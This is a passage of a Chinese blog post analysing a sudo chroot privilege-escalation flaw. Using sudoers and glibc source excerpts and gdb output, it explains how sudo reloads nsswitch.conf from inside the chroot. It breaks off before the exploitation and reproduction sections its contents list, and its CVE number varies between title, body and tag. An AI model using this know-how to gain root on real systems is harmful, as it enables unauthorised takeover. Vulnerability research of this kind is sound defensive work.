<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析">
<meta property="og:url" content="https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-e0349e6cc7ed7c3f2e12c5302cbbe90b-ff4613.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-ae30cc1334244617aaa6501e9fab6056-804675.png">
<meta property="article:published_time" content="2025-07-01T22:00:31.000Z">
<meta property="article:modified_time" content="2025-07-02T14:35:32.228Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="CVE-CVE-2025-3246">
<meta property="article:tag" content="sudo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-02-e0349e6cc7ed7c3f2e12c5302cbbe90b-ff4613.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/offbyone-conference-When_ASUS_IoT_Devices_Play_Hide-and-Seek_with_Security.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&text=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&is_video=false&description=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析&body=Check out this article: https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&title=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&name=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html&t=CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nss-database-check-reload-and-get-%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">nss_database_check_reload_and_get 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reload-disabled"><span class="toc-number">1.2.</span> <span class="toc-text">reload_disabled</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-evil-library"><span class="toc-number">1.3.</span> <span class="toc-text">load evil library</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patched"><span class="toc-number">3.</span> <span class="toc-text">Patched</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-01T22:00:31.000Z" itemprop="datePublished">2025-07-02</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE-CVE-2025-3246/" rel="tag">CVE-CVE-2025-3246</a>, <a class="tag-link-link" href="/tags/sudo/" rel="tag">sudo</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>startascale 6 月 30 日发布了几个 sudo 的提权漏洞，CVE-CVE-2025-32463<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">[1]</span></a></sup> 是其中一个， 另外一个 CVE-2025-32462<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://codebrowser.dev/glibc/glibc/nss/nss_database.c.html#nss_database_check_reload_and_get">[2]</span></a></sup> 需要一个特殊配置。</p>
<blockquote>
<p>该漏洞依赖于 Sudo 规则被限制在特定主机名或主机名模式的配置场景下。如果满足这些条件，权限提升到 root 无需任何漏洞利用（exploit）。</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2025-32463在Sudo v1.9.14（2023年6月）中引入（<a href="https://github.com/sudo-project/sudo/blob/SUDO_1_9_14/NEWS%EF%BC%89%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8chroot%E5%8A%9F%E8%83%BD%E6%97%B6%EF%BC%8C%E6%9B%B4%E6%96%B0%E4%BA%86%E5%91%BD%E4%BB%A4%E5%8C%B9%E9%85%8D%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%E3%80%82%E6%9C%AC%E6%96%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%9A%84sudo%E4%BB%A3%E7%A0%81">https://github.com/sudo-project/sudo/blob/SUDO_1_9_14/NEWS），在使用chroot功能时，更新了命令匹配处理代码。本文漏洞分析的sudo代码</a> commit 为： cb3355e9d4f66db642b9c0e9151423762504339b </p>
<p>该代码逻辑在， plugins/sudoers/sudoers.c 文件中的 <code>set_cmnd_path</code> 函数里，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">set_cmnd_path(struct sudoers_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *runchroot)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Pivot root. */</span></span><br><span class="line">    <span class="keyword">if</span> (runchroot != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!pivot_root(runchroot, &amp;pivot_state))</span><br><span class="line">	    <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">		...</span><br><span class="line">	ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path);</span><br><span class="line">		...</span><br><span class="line">	<span class="keyword">if</span> (runchroot != <span class="literal">NULL</span>)</span><br><span class="line">		(<span class="keyword">void</span>)unpivot_root(&amp;pivot_state);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>

<p>代码逻辑大致是:<br>    1. <code>pivot_root 函数进行 chroot     2. </code>resolve_cmnd<code>函数去进行命令的匹配查找路径     3. 最后</code>unpivot_root` chroot 回到原来的 root path</p>
<p>漏洞的发生点其实就是在 <code>pivot_root</code> 和 <code>unpivot_root</code> 之间，有代码逻辑去读取 <code>/etc/nsswitch.conf</code> 文件并进行了 <code>nss_database*</code> 的更新。</p>
<p>当我看到这个漏洞和代码的时候有一个直觉性的疑问， 如果在 chroot 后会进行 <code>/etc/nsswitch.conf</code> 的读取， 且读取的是 chroot 里的文件，那么为什么<code>unpivot_root</code> 后代码代码逻辑不会重新读取 <code>/etc/nsswitch.conf</code> 。 因此这个漏洞分析以两个疑问展开分析：</p>
<ol>
<li><code>pivot_root</code> 和 <code>unpivot_root</code>  之间什么操作导致会重新加载 <code>/etc/nsswitch.conf</code></li>
<li>为什么 <code>unpivot_root</code> 之后到加载恶意代码之前不会重新读取 <code>/etc/nsswitch.conf</code></li>
</ol>
<h3 id="nss-database-check-reload-and-get-分析"><a href="#nss-database-check-reload-and-get-分析" class="headerlink" title="nss_database_check_reload_and_get 分析"></a>nss_database_check_reload_and_get 分析</h3><p>对 <code>nss</code> 相关代码的简单追踪， 我们定位到 <code>nss_database_check_reload_and_get</code><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://codebrowser.dev/glibc/glibc/nss/nss_database.c.html#nss_database_check_reload_and_get">[2]</span></a></sup> 会调用 <code>nss_database_reload</code> 函数进而打开 <code>/etc/nsswitch.conf</code> 配置文件</p>
<p>调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static bool nss_database_check_reload_and_get </span><br><span class="line">	-&gt; static bool ss_database_reload </span><br><span class="line">		-&gt; FILE *fp &#x3D; fopen (_PATH_NSSWITCH_CONF, &quot;rce&quot;);</span><br></pre></td></tr></table></figure>

<p>我们在 <code>pivot_root</code> 之后对 <code>nss_database_check_reload_and_get</code> 下个断点，此时 gdb 的backtrace 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7fffffffc510, database_index&#x3D;nss_database_initgroups)</span><br><span class="line">    at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">warning: 396	.&#x2F;nss&#x2F;nss_database.c: No such file or directory</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  nss_database_check_reload_and_get (local&#x3D;0x5555555a1ad0, result&#x3D;0x7fffffffc510, database_index&#x3D;nss_database_initgroups) at .&#x2F;nss&#x2F;nss_database.c:396</span><br><span class="line">#1  0x00007ffff7d56ddc in internal_getgrouplist (user&#x3D;user@entry&#x3D;0x5555555a8d98 &quot;root&quot;, group&#x3D;group@entry&#x3D;0, size&#x3D;size@entry&#x3D;0x7fffffffc568,</span><br><span class="line">    groupsp&#x3D;groupsp@entry&#x3D;0x7fffffffc570, limit&#x3D;limit@entry&#x3D;-1) at .&#x2F;nss&#x2F;initgroups.c:75</span><br><span class="line">#2  0x00007ffff7d570dc in getgrouplist (user&#x3D;user@entry&#x3D;0x5555555a8d98 &quot;root&quot;, group&#x3D;group@entry&#x3D;0, groups&#x3D;groups@entry&#x3D;0x7ffff7b15010,</span><br><span class="line">    ngroups&#x3D;ngroups@entry&#x3D;0x7fffffffc5d4) at .&#x2F;nss&#x2F;initgroups.c:156</span><br><span class="line">#3  0x00007ffff7fa51a9 in sudo_getgrouplist2_v1 (name&#x3D;0x5555555a8d98 &quot;root&quot;, basegid&#x3D;0, groupsp&#x3D;groupsp@entry&#x3D;0x7fffffffc630,</span><br><span class="line">    ngroupsp&#x3D;ngroupsp@entry&#x3D;0x7fffffffc63c) at .&#x2F;getgrouplist.c:105</span><br><span class="line">#4  0x00007ffff7ed987e in sudo_make_gidlist_item (pw&#x3D;0x5555555a8d68, ngids&#x3D;&lt;optimized out&gt;, gids&#x3D;&lt;optimized out&gt;, gidstrs&#x3D;0x0, type&#x3D;1) at .&#x2F;pwutil_impl.c:298</span><br><span class="line">#5  0x00007ffff7ed83d5 in sudo_get_gidlist (pw&#x3D;0x5555555a8d68, type&#x3D;type@entry&#x3D;1) at .&#x2F;pwutil.c:1033</span><br><span class="line">#6  0x00007ffff7ecfbcb in runas_getgroups (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;) at .&#x2F;match.c:146</span><br><span class="line">#7  0x00007ffff7ebbc3c in runas_setgroups (ctx&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;) at .&#x2F;set_perms.c:1634</span><br><span class="line">#8  set_perms (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;, perm&#x3D;perm@entry&#x3D;5) at .&#x2F;set_perms.c:285</span><br><span class="line">#9  0x00007ffff7edadb8 in resolve_cmnd (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;, infile&#x3D;infile@entry&#x3D;0x7fffffffe594 &quot;woot&quot;,</span><br><span class="line">    outfile&#x3D;outfile@entry&#x3D;0x7fffffffcc40, path&#x3D;path@entry&#x3D;0x5555555b0400 &quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;snap&#x2F;bin&quot;)</span><br><span class="line">    at .&#x2F;resolve_cmnd.c:42</span><br><span class="line">#10 0x00007ffff7ebebbc in set_cmnd_path (ctx&#x3D;ctx@entry&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;, runchroot&#x3D;0x5555555a701c &quot;woot&quot;) at .&#x2F;sudoers.c:1108</span><br><span class="line">#11 0x00007ffff7ebf047 in set_cmnd (ctx&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;) at .&#x2F;sudoers.c:1177</span><br><span class="line">#12 sudoers_check_common (pwflag&#x3D;pwflag@entry&#x3D;0, ctx&#x3D;0x7ffff7f296a0 &lt;sudoers_ctx&gt;) at .&#x2F;sudoers.c:358</span><br><span class="line">#13 0x00007ffff7ec06c8 in sudoers_check_cmnd (argc&#x3D;argc@entry&#x3D;1, argv&#x3D;argv@entry&#x3D;0x7fffffffe2d0, env_add&#x3D;env_add@entry&#x3D;0x0,</span><br><span class="line">    closure&#x3D;closure@entry&#x3D;0x7fffffffcdd0) at .&#x2F;sudoers.c:689</span><br><span class="line">#14 0x00007ffff7eb6673 in sudoers_policy_check (argc&#x3D;1, argv&#x3D;0x7fffffffe2d0, env_add&#x3D;0x0, command_infop&#x3D;0x7fffffffcea0, argv_out&#x3D;0x7fffffffcea8,</span><br><span class="line">    user_env_out&#x3D;0x7fffffffceb0, errstr&#x3D;0x7fffffffcec8) at .&#x2F;policy.c:1244</span><br><span class="line">#15 0x000055555555cffb in policy_check (run_envp&#x3D;0x7fffffffceb0, run_argv&#x3D;0x7fffffffcea8, command_info&#x3D;0x7fffffffcea0, env_add&#x3D;0x0, argv&#x3D;0x7fffffffe2d0,</span><br><span class="line">    argc&#x3D;1) at .&#x2F;sudo.c:1266</span><br><span class="line">#16 main (</span><br></pre></td></tr></table></figure>

<p>当前 <code>nss_database_check_reload_and_get</code> 的第三个参数 <code>database_index</code> 为 <code>nss_database_initgroups</code>， <code>local</code> 参数结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *local</span><br><span class="line">$1 &#x3D; &#123;data &#x3D; &#123;nsswitch_conf &#x3D; &#123;size &#x3D; 527, ino &#x3D; 106330, mtime &#x3D; &#123;tv_sec &#x3D; 1751446775, tv_nsec &#x3D; 344332209&#125;, ctime &#x3D; &#123;tv_sec &#x3D; 1751446775,</span><br><span class="line">        tv_nsec &#x3D; 345332238&#125;&#125;, services &#x3D; &#123;0x5555555a1060, 0x5555555a2070, 0x5555555a1200, 0x5555555a20c0, 0x5555555a1200, 0x5555555a2020, 0x0,</span><br><span class="line">      0x5555555a20c0, 0x5555555a1060, 0x5555555a1200, 0x5555555a20c0, 0x5555555a2070, 0x5555555a3b20, 0x5555555a2070, 0x5555555a2070, 0x5555555a1200,</span><br><span class="line">      0x5555555a20c0&#125;, reload_disabled &#x3D; 0, initialized &#x3D; true&#125;, lock &#x3D; 0, root_ino &#x3D; 2, root_dev &#x3D; 64769&#125;</span><br></pre></td></tr></table></figure>

<p> 其中 services 对应如下：<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> DEFINE_DATABASE (aliases)</span><br><span class="line">DEFINE_DATABASE (ethers)</span><br><span class="line">DEFINE_DATABASE (group)</span><br><span class="line">DEFINE_DATABASE (group_compat)</span><br><span class="line">DEFINE_DATABASE (gshadow)</span><br><span class="line">DEFINE_DATABASE (hosts)</span><br><span class="line">DEFINE_DATABASE (initgroups)</span><br><span class="line">DEFINE_DATABASE (netgroup)</span><br><span class="line">DEFINE_DATABASE (networks)</span><br><span class="line">DEFINE_DATABASE (passwd)</span><br><span class="line">DEFINE_DATABASE (passwd_compat)</span><br><span class="line">DEFINE_DATABASE (protocols)</span><br><span class="line">DEFINE_DATABASE (publickey)</span><br><span class="line">DEFINE_DATABASE (rpc)</span><br><span class="line">DEFINE_DATABASE (services)</span><br><span class="line">DEFINE_DATABASE (shadow)</span><br><span class="line">DEFINE_DATABASE (shadow_compat)</span><br></pre></td></tr></table></figure></p>
<p>在进 <code>nss_database_reload</code> 函数的时候，里面有个逻辑是， 如果 <code>staging-&gt;services[i] == NULL</code> 就设置为 default 的值，  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NSS_DATABASE_COUNT; ++i)</span><br><span class="line">  <span class="keyword">if</span> (staging-&gt;services[i] == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ok = nss_database_select_default (&amp;cache, i,</span><br><span class="line">                                        &amp;staging-&gt;services[i]);</span><br><span class="line">      <span class="keyword">if</span> (!ok)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由 <code>nss_database_select_default</code> 获取然后设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> per_database_defaults[NSS_DATABASE_COUNT] =</span><br><span class="line">  &#123;</span><br><span class="line">   [nss_database_group] = nss_database_default_compat,</span><br><span class="line">   [nss_database_group_compat] = nss_database_default_nis,</span><br><span class="line">   [nss_database_gshadow] = nss_database_default_files,</span><br><span class="line">   [nss_database_hosts] = nss_database_default_dns,</span><br><span class="line">   [nss_database_initgroups] = nss_database_default_none,</span><br><span class="line">   [nss_database_networks] = nss_database_default_dns,</span><br><span class="line">   [nss_database_passwd] = nss_database_default_compat,</span><br><span class="line">   [nss_database_passwd_compat] = nss_database_default_nis,</span><br><span class="line">   [nss_database_publickey] = nss_database_default_nis_nisplus,</span><br><span class="line">   [nss_database_shadow] = nss_database_default_compat,</span><br><span class="line">   [nss_database_shadow_compat] = nss_database_default_nis,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">nss_database_select_default (struct nss_database_default_cache *cache,</span><br><span class="line">                             <span class="keyword">enum</span> nss_database db, nss_action_list *result)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">nss_database_default</span> <span class="title">def</span> =</span> per_database_defaults[db];</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">case</span> nss_database_default_none:</span><br><span class="line">      <span class="comment">/* Very special case: Leave *result as NULL.  */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	...</span><br><span class="line">  *result = __nss_action_parse (line);</span><br><span class="line">  <span class="keyword">if</span> (*result == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (errno == ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>在 <code>nss_database_initgroups</code> 设置的时候，默认为 None， 因此此时 <code>service</code> 为 <code>nss_database_initgroups</code> 是 0x0 (<strong>这个很重要</strong>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *local</span><br><span class="line">$1 &#x3D; &#123;data &#x3D; &#123;nsswitch_conf &#x3D; &#123;size &#x3D; 527, ino &#x3D; 106330, mtime &#x3D; &#123;tv_sec &#x3D; 1751446775, tv_nsec &#x3D; 344332209&#125;, ctime &#x3D; &#123;tv_sec &#x3D; 1751446775,</span><br><span class="line">        tv_nsec &#x3D; 345332238&#125;&#125;, services &#x3D; &#123;0x5555555a1060, 0x5555555a2070, 0x5555555a1200, 0x5555555a20c0, 0x5555555a1200, 0x5555555a2020, 0x0,</span><br><span class="line">      0x5555555a20c0, 0x5555555a1060, 0x5555555a1200, 0x5555555a20c0, 0x5555555a2070, 0x5555555a3b20, 0x5555555a2070, 0x5555555a2070, 0x5555555a1200,</span><br><span class="line">      0x5555555a20c0&#125;, reload_disabled &#x3D; 0, initialized &#x3D; true&#125;, lock &#x3D; 0, root_ino &#x3D; 2, root_dev &#x3D; 64769&#125;</span><br></pre></td></tr></table></figure>


<p>解释了下，此时<code>((struct nss_database_state *)local)-&gt;data.services[nss_database_initgroups]</code>为空的原因，我们接着回到 <code>nss_database_check_reload_and_get</code>的代码里：</p>
